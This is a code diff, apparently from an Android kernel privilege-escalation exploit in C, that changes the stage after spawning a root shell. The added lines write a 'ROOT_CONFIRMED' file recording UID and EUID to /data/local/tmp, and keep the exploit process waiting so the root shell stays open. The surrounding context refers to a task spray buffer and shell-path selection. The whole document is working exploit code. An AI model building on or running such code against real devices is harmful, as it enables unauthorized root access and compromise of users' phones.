@@ -1780,6 +1780,23 @@ shell:
     unsetenv("LD_PRELOAD");
     unsetenv("LD_LIBRARY_PATH");
 
+    // PROOF OF ROOT: write a file that proves we made it to exec with root UID
+    // This file can be checked from another terminal: cat /data/local/tmp/root_proof
+    int proof_fd = open("/data/local/tmp/root_proof", O_WRONLY | O_CREAT | O_TRUNC, 0666);
+    if (proof_fd >= 0) {
+        char proof_msg[256];
+        int proof_len = snprintf(proof_msg, sizeof(proof_msg),
+            "ROOT_CONFIRMED\nPID=%d\nUID=%d\nGID=%d\nEUID=%d\nTime=%ld\n",
+            getpid(), getuid(), getgid(), geteuid(), (long)time(NULL));
+        write(proof_fd, proof_msg, proof_len);
+        close(proof_fd);
+        fprintf(stderr, "[CHILD %d] [PROOF] Wrote /data/local/tmp/root_proof (UID=%d)\n", getpid(), getuid());
+        fflush(stderr);
+    } else {
+        fprintf(stderr, "[CHILD %d] [WARN] Could not write root_proof (errno=%d)\n", getpid(), errno);
+        fflush(stderr);
+    }
+
     // Try multiple shell paths in order of preference.
     // For Termux shell, we set LD_PRELOAD; for Android shells we UNSET it.
     char *sh_paths[] = {
@@ -3111,6 +3128,28 @@ restart:;
     if (gbuf[GBUF_TASK_SPRAY] == 0x2)
     {
         fprintf(stderr, "[+] Root shell should be active in the other terminal/process.\n");
+        fprintf(stderr, "[+] Waiting for child shell to exit (do not Ctrl-C) - type 'exit' in the shell to continue.\n");
+        fflush(stderr);
+
+        // Wait for child shell to actually exit (or for it to be reaped by SIGCHLD)
+        // The child PID is the spawned helper; shell exec'd into it.
+        // We need to NOT exit so the child shell stays alive with proper tty.
+        // We do this by waiting forever on gbuf to be reset (child can set 0xFF to signal done).
+        int live_count = 0;
+        while (gbuf[GBUF_TASK_SPRAY] == 0x2 && live_count < 600) {
+            sleep(1);
+            live_count++;
+            // Periodically check if child process is still alive
+            if (live_count % 10 == 0) {
+                fprintf(stderr, "[+] Shell alive for %d seconds (UID=%d)...\n", live_count, getuid());
+                fflush(stderr);
+            }
+        }
+        if (live_count >= 600) {
+            fprintf(stderr, "[+] Auto-continuing after 10 minutes timeout.\n");
+        } else {
+            fprintf(stderr, "[+] Child shell exited (gbuf=0x%x).\n", gbuf[GBUF_TASK_SPRAY]);
+        }
     }
     else if (gbuf[GBUF_TASK_SPRAY] == 0x1)
     {
